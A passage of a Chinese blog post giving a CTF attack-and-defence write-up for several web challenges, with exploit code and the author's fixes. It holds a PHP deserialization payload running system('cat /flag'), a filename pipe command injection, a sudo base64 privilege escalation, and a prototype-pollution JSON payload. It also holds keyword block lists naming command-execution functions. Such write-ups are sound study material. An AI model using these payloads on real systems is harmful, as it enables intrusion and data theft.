+<p>经典php反序列化，也不难</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+Class Dog &#123;
+    <span class="keyword">public</span> <span class="variable">$bone</span>;
+    <span class="keyword">public</span> <span class="variable">$meat</span>=<span class="number">240610708</span>;
+    <span class="keyword">public</span> <span class="variable">$beef</span>=<span class="string">&quot;QNKCDZO&quot;</span>;
+    <span class="keyword">public</span> <span class="variable">$candy</span>;
+
+&#125;
+
+CLass mouse &#123;
+    <span class="keyword">public</span> <span class="variable">$rice</span>;
+
+
+&#125;
+
+<span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;
+    <span class="keyword">public</span> <span class="variable">$fish</span>;
+
+
+&#125;
+
+<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Cat</span>();
+<span class="variable">$a</span>-&gt;fish = <span class="keyword">new</span> <span class="title class_">Dog</span>();
+<span class="variable">$a</span>-&gt;fish-&gt;bone = <span class="keyword">new</span> <span class="title class_">Dog</span>();
+<span class="variable">$a</span>-&gt;fish-&gt;bone-&gt;candy = <span class="keyword">new</span> <span class="title function_ invoke__">mouse</span>();
+<span class="variable">$a</span>-&gt;fish-&gt;bone-&gt;candy-&gt;rice = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;
+<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</code></pre>
+<p>当成图片的内容提交就可以</p>
+<p>还有一个show.php,忘记保存了，用file_get_contents来处理传入的file参数貌似，回头一想其实那边是可以打filter链的</p>
+<p>这里fix没过就讲一下我的思路希望有师傅可以指出哪里错了(贴全文太麻烦了就把改了的部分给一下)</p>
+<pre><code class="highlight php"><span class="variable">$fileContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploadedFile</span>);
+            <span class="comment">//fix</span>
+            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|\?|\*|O|:/i&quot;</span>, <span class="variable">$fileContent</span>)) &#123;
+                <span class="keyword">die</span>(<span class="string">&#x27;no!&#x27;</span>);
+            &#125;
+            <span class="comment">//fix</span>
+            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$uploadedFile</span>);</code></pre>
+<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;
+        <span class="keyword">if</span> ((<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;meat) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;beef)) &amp;&amp; (<span class="variable language_">$this</span>-&gt;meat != <span class="variable language_">$this</span>-&gt;beef)) &#123;
+            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;candy-&gt;flag;
+        &#125;
+    &#125;
+</code></pre>
+<h3 id="image2base64"><a class="markdownIt-Anchor" href="#image2base64"></a> image2base64</h3>
+<h4 id="break-2"><a class="markdownIt-Anchor" href="#break-2"></a> break</h4>
+<pre><code class="highlight py"><span class="keyword">import</span> os
+<span class="keyword">import</span> re
+<span class="keyword">import</span> subprocess
+<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify
+
+app = Flask(__name__)
+
+UPLOAD_FOLDER = <span class="string">&#x27;uploads/&#x27;</span>
+<span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(UPLOAD_FOLDER):
+    os.makedirs(UPLOAD_FOLDER)
+
+app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER
+<span class="keyword">def</span> <span class="title function_">checkname</span>(<span class="params">filename</span>):
+
+    ILLEGAL_CHARACTERS = <span class="string">r&quot;[*=&amp;\&quot;%;&lt;&gt;iashto!@()\&#123;\&#125;\[\]_^`\&#x27;~\\#]&quot;</span>
+    noip = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d+\.\d+&quot;</span>)
+    <span class="keyword">if</span> re.search(ILLEGAL_CHARACTERS, filename):
+        <span class="keyword">return</span> <span class="literal">False</span>
+    <span class="keyword">if</span> <span class="string">&quot;..&quot;</span> <span class="keyword">in</span> filename :
+        <span class="keyword">return</span> <span class="literal">False</span>
+    <span class="keyword">if</span>(noip.findall(filename)):
+        <span class="keyword">return</span> <span class="literal">False</span>
+
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
+<span class="keyword">def</span> <span class="title function_">upload_form</span>():
+    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)
+
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span>
+<span class="keyword">def</span> <span class="title function_">upload_file</span>():
+    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:
+        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;No file part in the request&quot;</span>&#125;), <span class="number">400</span>
+
+    file = request.files[<span class="string">&#x27;file&#x27;</span>]
+    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:
+        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;No file selected&quot;</span>&#125;), <span class="number">400</span>
+    <span class="keyword">if</span>(checkname(file.filename)==<span class="literal">False</span>):
+        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Not hacking!&quot;</span>&#125;), <span class="number">500</span>
+    <span class="keyword">if</span> file:
+        file_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)
+        file.save(file_path)
+        result = subprocess.run(<span class="string">f&quot;cat <span class="subst">&#123;file_path&#125;</span> | base64&quot;</span>, shell=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)
+        encoded_string = result.stdout.strip()
+        <span class="keyword">return</span> jsonify(&#123;
+            <span class="string">&quot;filename&quot;</span>: file.filename,
+            <span class="string">&quot;base64&quot;</span>: encoded_string
+        &#125;)
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:
+    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)</code></pre>
+<p>看到subprocess和填充file_path马上心领神会，直接管道符(因为这里;被ban掉了)</p>
+<p>后面看这个waf有点麻烦，就没去继续做</p>
+<p>后面给了hint:![屏幕截图 2025-09-06 125919](<a target="_blank" rel="noopener" href="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/屏幕截图</a> 2025-09-06 125919.png)</p>
+<p>什么几把看不懂了。。遂不做，后面看了下别人的wp发现这里是要上传一个写了反弹shell命令的文件</p>
+<p>再同样的上传，并给filename动手脚用管道符执行shell($0)</p>
+<p>这里可以去看ctfshow的极限命令执行，好东西，后悔当初没去学。</p>
+<p>后面是sudo免密，其实就是sudo提权读flag</p>
+<pre><code class="highlight bash"><span class="built_in">sudo</span> -l</code></pre>
+<p>然后发现base64是免密执行bash的</p>
+<pre><code class="highlight plaintext">sudo base64 &quot;/f1111llaaa444Aaag9gggg&quot; |base64 -- decode</code></pre>
+<h4 id="fix"><a class="markdownIt-Anchor" href="#fix"></a> fix</h4>
+<p>fix的时候huanghunr师傅说就加了<code>|</code>，我是把它整个checkname函数给重新写了，感觉很难评的一道题</p>
+<p>感觉其实原来基础上加一个<code>|</code>就能过，第一次不知道为什么没过，这边fix就不写了，不难写</p>
+<h3 id="easy_shop"><a class="markdownIt-Anchor" href="#easy_shop"></a> Easy_shop</h3>
+<h4 id="break-3"><a class="markdownIt-Anchor" href="#break-3"></a> break</h4>
+<p>进去是一个商店购买页面，一眼盯帧就是去刷负数量</p>
+<p>美滋滋吃到1500，就可以买到flag。了吗?</p>
+<p>并非，后面给了个路由让我们去读flag</p>
+<pre><code class="highlight plaintext">/showflag</code></pre>
+<p>进去还是任意文件读，不给读flag</p>
+<p>读一下源码</p>
+<pre><code class="highlight js"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);
+<span class="keyword">const</span> app = <span class="title function_">express</span>();
+<span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);
+<span class="keyword">const</span> port = <span class="number">3000</span>;
+<span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);
+
+app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);
+app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>));
+app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));
+
+<span class="keyword">let</span> money = <span class="number">1000</span>;
+<span class="keyword">const</span> initialMoney = <span class="number">1000</span>;
+<span class="keyword">let</span> message = <span class="string">&#x27;&#x27;</span>;
+<span class="keyword">const</span> products = [
+  &#123; <span class="attr">name</span>: <span class="string">&#x27;帽子&#x27;</span>, <span class="attr">price</span>: <span class="number">10</span> &#125;,
+  &#123; <span class="attr">name</span>: <span class="string">&#x27;棒球&#x27;</span>, <span class="attr">price</span>: <span class="number">15</span> &#125;,
+  &#123; <span class="attr">name</span>: <span class="string">&#x27;iphone&#x27;</span>, <span class="attr">price</span>: <span class="number">150</span> &#125;,
+  &#123; <span class="attr">name</span>: <span class="string">&#x27;flag&#x27;</span>, <span class="attr">price</span>: <span class="number">1500</span> &#125;,
+];
+
+app.<span class="title function_">get</span>(<span class="string">&#x27;/showflag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;
+  res.<span class="title function_">render</span>(<span class="string">&#x27;readfile&#x27;</span>);
+&#125;);
+
+app.<span class="title function_">post</span>(<span class="string">&#x27;/readfile&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;
+  <span class="keyword">const</span> fileName = req.<span class="property">body</span>.<span class="property">fileName</span>;
+
+  <span class="keyword">if</span> (fileName.<span class="title function_">includes</span>(<span class="string">&quot;fl&quot;</span>)) &#123;
+    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&#x27;你还真读flag啊&#x27;</span>);
+  &#125;
+  <span class="comment">// 读取文件内容</span>
+  fs.<span class="title function_">readFile</span>(<span class="string">&quot;/app/public/&quot;</span>+fileName, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;
+    <span class="keyword">if</span> (err) &#123;
+      res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading the file&#x27;</span>);
+    &#125; <span class="keyword">else</span> &#123;
+      res.<span class="title function_">send</span>(data);
+    &#125;
+  &#125;);
+&#125;);
+
+
+app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;
+  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; products, money, message &#125;);
+&#125;);
+
+app.<span class="title function_">get</span>(<span class="string">&#x27;/buy/:productIndex&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;
+  <span class="keyword">const</span> productIndex = req.<span class="property">params</span>.<span class="property">productIndex</span>;
+  <span class="keyword">let</span> quantity = req.<span class="property">query</span>.<span class="property">quantity</span> || <span class="number">1</span>; <span class="comment">// 获取购买数量，默认为1</span>
+
+  <span class="keyword">if</span> (productIndex === <span class="string">&#x27;3&#x27;</span>) &#123;
+    quantity = <span class="title class_">Math</span>.<span class="title function_">abs</span>(quantity); <span class="comment">// 取绝对值</span>
+    <span class="keyword">if</span> (products[productIndex] &amp;&amp; money &gt;= products[productIndex].<span class="property">price</span> * quantity) &#123;
+      money -= products[productIndex].<span class="property">price</span> * quantity;
+      message = <span class="string">`购买flag成功啦！给你/showflag这个路由，听说那里面有flag`</span>;
+
+
+      res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; products, money, message, <span class="attr">showAlert</span>: <span class="literal">true</span> &#125;);
+    &#125; <span class="keyword">else</span> &#123;
+      message = <span class="string">&#x27;flag很贵的&#x27;</span>;
+      res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);
+    &#125;
+  &#125;<span class="keyword">else</span>&#123;
+    <span class="keyword">if</span> (products[productIndex] &amp;&amp; money &gt;= products[productIndex].<span class="property">price</span> * quantity) &#123;
+      money -= products[productIndex].<span class="property">price</span> * quantity;
+      message = <span class="string">`成功购买了 <span class="subst">$&#123;quantity&#125;</span> 件 &quot;<span class="subst">$&#123;products[productIndex].name&#125;</span>&quot;！`</span>;
+
+      <span class="comment">// 使用 JavaScript 弹窗来显示购买成功消息</span>
+      res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; products, money, message, <span class="attr">showAlert</span>: <span class="literal">true</span> &#125;);
+    &#125; <span class="keyword">else</span> &#123;
+      message = <span class="string">&#x27;购买失败，钱不够啊老铁.&#x27;</span>;
+      res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);
+    &#125;
+  &#125;
+&#125;);
+
+
+
+<span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>) &#123;
+  <span class="keyword">if</span> (<span class="keyword">typeof</span> object1 !== <span class="string">&#x27;object&#x27;</span> || object1 === <span class="literal">null</span> ||
+      <span class="keyword">typeof</span> object2 !== <span class="string">&#x27;object&#x27;</span> || object2 === <span class="literal">null</span>) &#123;
+    <span class="keyword">return</span>;
+  &#125;
+
+  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;
+    <span class="keyword">if</span> (
+      <span class="keyword">typeof</span> object2[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp;
+      object2[key] !== <span class="literal">null</span> &amp;&amp;
+      <span class="keyword">typeof</span> object1[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp;
+      object1[key] !== <span class="literal">null</span>
+    ) &#123;
+      <span class="title function_">copy</span>(object1[key], object2[key]); <span class="comment">// ✅ 安全递归</span>
+    &#125; <span class="keyword">else</span> &#123;
+      object1[key] = object2[key]; <span class="comment">// ✅ 直接赋值</span>
+    &#125;
+  &#125;
+&#125;
+
+
+app.<span class="title function_">post</span>(<span class="string">&#x27;/getflag&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(), <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;
+  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);
+  <span class="keyword">const</span> flagFilePath = <span class="string">&#x27;/flag&#x27;</span>;
+  <span class="keyword">let</span> flag = <span class="string">&#x27;&#x27;</span>;
+  fs.<span class="title function_">readFile</span>(flagFilePath, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;
+    <span class="keyword">if</span> (err) &#123;
+      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`无法读取文件: <span class="subst">$&#123;flagFilePath&#125;</span>`</span>);
+    &#125; <span class="keyword">else</span> &#123;
+      flag = data; <span class="comment">// 将文件内容赋值给flag变量</span>
+      <span class="keyword">var</span> secert = &#123;&#125;;
+      <span class="keyword">var</span> sess = req.<span class="property">session</span>;
+      <span class="keyword">let</span> user = &#123;&#125;;
+      <span class="title function_">copy</span>(user, req.<span class="property">body</span>);
+      <span class="keyword">if</span> (secert.<span class="property">testattack</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;
+        res.<span class="title function_">end</span>(flag);
+
+      &#125; <span class="keyword">else</span> &#123;
+        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;no,no,no!&quot;</span>);
+      &#125;
+    &#125;
+  &#125;);
+&#125;);
+
+
+app.<span class="title function_">get</span>(<span class="string">&#x27;/reset&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;
+  money = initialMoney;
+  message = <span class="string">&#x27;&#x27;</span>;
+  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);
+&#125;);
+
+app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;
+  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is running on http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);
+&#125;);</code></pre>
+<p>吼吼，原来前面的都没啥用，最主要的在这一块</p>
+<pre><code class="highlight js"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>) &#123;
+  <span class="keyword">if</span> (<span class="keyword">typeof</span> object1 !== <span class="string">&#x27;object&#x27;</span> || object1 === <span class="literal">null</span> ||
+      <span class="keyword">typeof</span> object2 !== <span class="string">&#x27;object&#x27;</span> || object2 === <span class="literal">null</span>) &#123;
+    <span class="keyword">return</span>;
+  &#125;
+
+  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;
+    <span class="keyword">if</span> (
+      <span class="keyword">typeof</span> object2[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp;
+      object2[key] !== <span class="literal">null</span> &amp;&amp;
+      <span class="keyword">typeof</span> object1[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp;
+      object1[key] !== <span class="literal">null</span>
+    ) &#123;
+      <span class="title function_">copy</span>(object1[key], object2[key]); <span class="comment">// ✅ 安全递归</span>
+    &#125; <span class="keyword">else</span> &#123;
+      object1[key] = object2[key]; <span class="comment">// ✅ 直接赋值</span>
+    &#125;
+  &#125;
+&#125;
+
+
+app.<span class="title function_">post</span>(<span class="string">&#x27;/getflag&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(), <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;
+  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);
+  <span class="keyword">const</span> flagFilePath = <span class="string">&#x27;/flag&#x27;</span>;
+  <span class="keyword">let</span> flag = <span class="string">&#x27;&#x27;</span>;
+  fs.<span class="title function_">readFile</span>(flagFilePath, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;
+    <span class="keyword">if</span> (err) &#123;
+      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`无法读取文件: <span class="subst">$&#123;flagFilePath&#125;</span>`</span>);
+    &#125; <span class="keyword">else</span> &#123;
+      flag = data; <span class="comment">// 将文件内容赋值给flag变量</span>
+      <span class="keyword">var</span> secert = &#123;&#125;;
+      <span class="keyword">var</span> sess = req.<span class="property">session</span>;
+      <span class="keyword">let</span> user = &#123;&#125;;
+      <span class="title function_">copy</span>(user, req.<span class="property">body</span>);
+      <span class="keyword">if</span> (secert.<span class="property">testattack</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;
+        res.<span class="title function_">end</span>(flag);
+
+      &#125; <span class="keyword">else</span> &#123;
+        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;no,no,no!&quot;</span>);
+      &#125;
+    &#125;
+  &#125;);
+&#125;);</code></pre>
+<p>看到迭代就知道是原型链污染了</p>
+<pre><code class="highlight json"><span class="punctuation">&#123;</span>
+  <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+    <span class="attr">&quot;testattack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span>
+  <span class="punctuation">&#125;</span>
+<span class="punctuation">&#125;</span></code></pre>
+<p>这题没fix出来</p>
+<pre><code class="highlight plaintext">function copy(object1, object2) &#123;
+    if (typeof object1 !== &#x27;object&#x27; || object1 === null ||
+        typeof object2 !== &#x27;object&#x27; || object2 === null) &#123;
+        return;
+    &#125;
+    for (let key in object2) &#123;
+        if (
+            typeof object2[key] === &#x27;object&#x27; &amp;&amp;
+            object2[key] !== null &amp;&amp;
+            typeof object1[key] === &#x27;object&#x27; &amp;&amp;
+            object1[key] !== null
+        ) &#123;
+            copy(object1[key], object2[key]); // ✅ 安全递归
+        &#125; else &#123;
+        	//fix
+            if (key.includes(&quot;admin&quot;))&#123;
+                throw Error(&quot;no&quot;)
+            &#125;//fix
+            else&#123;
+                object1[key] = object2[key]; 
+            &#125;
+        &#125;
+    &#125;
+&#125;
+
+
+app.post(&#x27;/getflag&#x27;, require(&#x27;body-parser&#x27;).json(), function (req, res, next) &#123;
+    res.type(&#x27;html&#x27;);
+    const flagFilePath = &#x27;/flag&#x27;;
+    let flag = &#x27;&#x27;;
+    fs.readFile(flagFilePath, &#x27;utf8&#x27;, (err, data) =&gt; &#123;
+        if (err) &#123;
+            console.error(`无法读取文件: $&#123;flagFilePath&#125;`);
+        &#125; else &#123;
+            flag = data; // 将文件内容赋值给flag变量
+            //fix
+            var secert = &#123;&quot;testattack&quot;:&quot;user&quot;&#125;;
+            //fix
+            var sess = req.session;
+            let user = &#123;&#125;;
+            copy(user, req.body);
+            if (secert.testattack === &#x27;admin&#x27;) &#123;
+                res.end(flag);
+
+            &#125; else &#123;
+                return res.send(&quot;no,no,no!&quot;);
+            &#125;
+        &#125;
+    &#125;);
+&#125;);
+</code></pre>
+<p>还修了一个整数溢出防止钱反而增加</p>
+<p>结果等平台攻击完的日志里都能看到Exception:no还没fix也是闹麻了</p>
+<p>这里贴一下其他师傅的fix吧</p>
+<pre><code class="highlight plaintext">app.post(&#x27;/readfile&#x27;, (req, res) =&gt; &#123;
+  const fileName = req.body.fileName;
+
+  if (fileName.includes(&quot;fl&quot;)) &#123;
+    return res.status(200).send(&#x27;你还真读flag啊&#x27;);
+  &#125;
+  // 阻止读取源码
+  if (fileName.includes(&quot;ap&quot;)) &#123;
+    return res.status(200).send(&#x27;你还真读app.js啊&#x27;);
+  &#125;
+  // 读取文件内容
+  fs.readFile(&quot;/app/public/&quot;+fileName, &#x27;utf8&#x27;, (err, data) =&gt; &#123;
+    if (err) &#123;
+      res.status(500).send(&#x27;Error reading the file&#x27;);
+    &#125; else &#123;
+      res.send(data);
+    &#125;
+  &#125;);
+&#125;);
+
+app.get(&#x27;/buy/:productIndex&#x27;, (req, res) =&gt; &#123;
+  const productIndex = req.params.productIndex;
+  let quantity = req.query.quantity || 1; // 获取购买数量，默认为1
+
+  if (productIndex === &#x27;3&#x27;) &#123;
+    quantity = Math.abs(quantity); // 取绝对值
+    if (products[productIndex] &amp;&amp; money &gt;= products[productIndex].price * quantity) &#123;
+      money -= products[productIndex].price * quantity;
+      message = `购买flag成功啦！给你/showflag这个路由，听说那里面有flag`;
+
+      res.render(&#x27;index&#x27;, &#123; products, money, message, showAlert: true &#125;);
+    &#125; else &#123;
+      message = &#x27;flag很贵的&#x27;;
+      res.redirect(&#x27;/&#x27;);
+    &#125;
+  &#125;else&#123;
+    // 模仿上面对数量做绝对值，防止购买负数增加金钱
+    quantity = Math.abs(quantity); // 取绝对值
+    if (products[productIndex] &amp;&amp; money &gt;= products[productIndex].price * quantity) &#123;
+      money -= products[productIndex].price * quantity;
+      message = `成功购买了 $&#123;quantity&#125; 件 &quot;$&#123;products[productIndex].name&#125;&quot;！`;
+
+      // 使用 JavaScript 弹窗来显示购买成功消息
+      res.render(&#x27;index&#x27;, &#123; products, money, message, showAlert: true &#125;);
+    &#125; else &#123;
+      message = &#x27;购买失败，钱不够啊老铁.&#x27;;
+      res.redirect(&#x27;/&#x27;);
+    &#125;
+  &#125;
+&#125;);
+
+
+function copy(object1, object2) &#123;
+  if (typeof object1 !== &#x27;object&#x27; || object1 === null ||
+      typeof object2 !== &#x27;object&#x27; || object2 === null) &#123;
+    return;
+  &#125;
+
+  for (let key in object2) &#123;
+    // 过滤原型链污染常用字符串
+    if (key === &#x27;outputFunctionName&#x27; || key === &#x27;__proto__&#x27; || key === &#x27;constructor&#x27; || key === &#x27;prototype&#x27; || key === &#x27;return&#x27; || key === &#x27;global&#x27; || key === &#x27;process&#x27; || key === &#x27;mainModule&#x27; || key === &#x27;constructor&#x27; || key === &#x27;child&#x27; || key === &#x27;execSync&#x27; || key === &#x27;escapeFunction&#x27; || key === &#x27;client&#x27; || key === &#x27;compileDebug&#x27;) &#123;
+      continue;
+    &#125;
+
+    if (
+      typeof object2[key] === &#x27;object&#x27; &amp;&amp;
+      object2[key] !== null &amp;&amp;
+      typeof object1[key] === &#x27;object&#x27; &amp;&amp;
+      object1[key] !== null
+    ) &#123;
+      copy(object1[key], object2[key]); // ✅ 安全递归
+    &#125; else &#123;
+      object1[key] = object2[key]; // ✅ 直接赋值
+    &#125;
+  &#125;
+&#125;</code></pre>
+<p>其实感觉把原型链防掉就可以，因为毕竟关键点是在最后的，只是不知道它这个check过的判定到底是什么，实在没懂</p>
+<h3 id="genshop"><a class="markdownIt-Anchor" href="#genshop"></a> genshop</h3>
+<p>这道是0解题嘻嘻，端口都连不上SSRF拿头做，一直timed out ,不知道是不是我的问题。</p>
+<p>hint貌似 是5000端口SSRF+SSTI，中间还有一个hint忘记了</p>
+<p>直接贴源码吧</p>
+<pre><code class="highlight plaintext">from flask import Flask, request, send_file
+import socket
+
+app = Flask(&quot;webserver&quot;)
+
+
+@app.route(&#x27;/&#x27;, methods=[&quot;GET&quot;])
+def index():
+    return send_file(__file__)
+
+
+@app.route(&#x27;/nc&#x27;, methods=[&quot;POST&quot;])
+def nc():
+    try:
+        dstport = int(request.form[&#x27;port&#x27;])
+        data = request.form[&#x27;data&#x27;]
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        s.connect((&#x27;127.0.0.1&#x27;, dstport))
+        s.send(data.encode())
+        recvdata = b&#x27;&#x27;
+        while True:
+            chunk = s.recv(2048)
+            if not chunk.strip():
+                break
+            else:
+                recvdata += chunk
+                continue
+        return recvdata
+    except Exception as e:
+        return str(e)
+
+
+app.run(host=&quot;0.0.0.0&quot;, port=8080, threaded=True)</code></pre>
+<h4 id="fix-2"><a class="markdownIt-Anchor" href="#fix-2"></a> fix</h4>
+<p>fix看别人的反而挺简单的，但是为什么过了挺疑惑的。</p>
+<pre><code class="highlight plaintext"># return render_template_string(f&quot;&lt;h3&gt;&#123;result&#125;&lt;/h3&gt;&quot;)
+return f&quot;&lt;h3&gt;&#123;result&#125;&lt;/h3&gt;&quot;</code></pre>
+<p>这个真的能渲染到页面上吗。。源码没存故不能实测，残念</p>
+<p>我是上了一堆waf结果还是没拦住，也不知道啥问题，想过把动态渲染换成静态但是发现自己写不来嘻嘻()</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="AyaN0 微信">
+        <span>微信</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/08/02/AyaN0%E6%A1%91%E7%9A%84%E9%9B%86%E8%AE%AD%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/" rel="prev" title="AyaN0桑的集训阶段总结">
+                  <i class="fa fa-angle-left"></i> AyaN0桑的集训阶段总结
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">AyaN0</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">329k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">9:59</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
